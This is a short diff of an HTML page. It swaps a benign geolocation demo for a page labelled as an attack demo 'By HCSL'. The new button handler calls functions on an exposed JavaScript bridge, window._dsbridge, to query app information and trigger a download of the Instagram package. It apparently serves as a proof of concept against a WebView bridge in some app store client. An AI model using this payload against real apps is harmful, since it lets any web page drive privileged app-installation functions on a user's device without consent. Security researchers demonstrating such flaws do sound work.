@@ -1,27 +1,18 @@
 </head>
 <body>
-<p id="demo">点击按钮获取您当前坐标（可能需要比较长的时间获取）：</p>
+<p id="demo">攻击演示 By HCSL</p>
 <div style="text-align:center">
-   <button onclick="getLocation()">点我</button>
+   <button onclick="getLocation()">开始</button>
 </div>
 <script>
 var x=document.getElementById("demo");
 function getLocation()
 {
-	if (navigator.geolocation)
-	{
-		navigator.geolocation.getCurrentPosition(showPosition);
-	}
-	else
-	{
-		x.innerHTML="该浏览器不支持获取地理位置。";
-	}
-}
-
-function showPosition(position)
-{
-	x.innerHTML="纬度: " + position.coords.latitude + 
-	"<br>经度: " + position.coords.longitude;	
+   var handler;
+   var queryAppInformation_parameters = {'apkId':'com.instagram.android'};
+   window._dsbridge.queryAppInformation(queryAppInformation_parameters,handler);
+   var downloadButtonOnClick_parameters = {'packageName':'com.instagram.android'};
+   window._dsbridge.downloadButtonOnClick(downloadButtonOnClick_parameters,handler);
 }
 </script>
 </body>
